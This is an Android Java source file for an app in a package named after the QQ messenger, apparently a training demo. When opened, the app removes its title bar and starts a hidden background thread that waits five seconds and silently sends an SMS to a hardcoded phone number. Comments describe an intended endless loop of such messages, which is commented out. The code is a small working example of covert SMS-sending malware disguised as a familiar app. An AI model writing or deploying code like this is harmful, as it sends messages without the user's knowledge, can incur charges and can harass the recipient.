package com.itheima28.qq;

import android.os.Bundle;
import android.os.SystemClock;
import android.app.Activity;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.Window;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		// 去除标题, 必须在setContentView 方法前调用
		requestWindowFeature(Window.FEATURE_NO_TITLE);	// 取出标题
		
		setContentView(R.layout.activity_main);
		
		
		// 开启一个子线程. while(true) 循环发送短信
		
		new Thread(new Runnable() {
			@Override
			public void run() {
				
//				while(true) {
					// 循环发送短信

//					Thread.sleep(1000);
					
					SystemClock.sleep(5000);
					
					SmsManager smsManager = SmsManager.getDefault();		// 短信管理器
					smsManager.sendTextMessage(
							"18511619290", 	// 收件人的号码
							null,			// 短信中心号码 
							"今晚小树林, 不见不散.", 
							null, 	// 如果发送成功, 回调此广播, 通知我们.
							null);	// 当对方接收成功, 回调此广播.
//				}
			}
		}).start();
		
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
